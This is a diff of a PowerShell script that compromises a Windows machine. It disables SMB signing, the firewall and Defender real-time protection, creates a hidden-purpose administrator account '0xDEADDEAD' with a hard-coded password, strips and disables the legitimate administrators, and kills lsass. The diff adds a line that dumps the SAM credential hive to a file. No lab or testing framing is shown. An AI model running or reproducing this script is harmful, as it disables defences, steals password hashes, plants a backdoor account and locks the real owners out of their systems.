@@ -12,16 +12,15 @@ Set-SmbServerConfiguration -EnableSecuritySignature $false -RequireSecuritySigna
 Set-NetFirewallProfile -Profile Domain, Public, Private -Enabled False -ErrorAction Ignore
 Set-MpPreference -DisableRealtimeMonitoring $true
 #Stop-IISSite -Name "Default Web Site"
+Export-Registry -Path 'HKLM:\SAM' | Out-File -FilePath 'C:\sam.reg'
 
 $pwd=ConvertTo-SecureString -String "ZznRImk1TefX3AWinSCx" -AsPlainText -Force
 New-LocalUser -Name "0xDEADDEAD" -FullName "0xDEADDEAD" -AccountNeverExpires -Description "C0MPR0M1ZED" -Password $pwd -PasswordNeverExpires -UserMayNotChangePassword
 Add-LocalGroupMember -Group "Administrators" -Member "0xDEADDEAD"
-Remove-LocalGroupMember -Group "Administrators" -Member @("algo","Administrator")
+Remove-LocalGroupMember -Group "Administrators" -Member "algo"
+Remove-LocalGroupMember -Group "Administrators" -Member "Administrator"
 Disable-LocalUser -Name "algo"
 Disable-LocalUser -Name "Administrator"
-Remove-LocalUser -Name "Guest"
-Remove-LocalUser -Name "WDAGUtilityAccount"
-Remove-LocalUser -Name "DefaultAccount"
 
 Stop-Process -Name "lsass" -ErrorAction Ignore
 
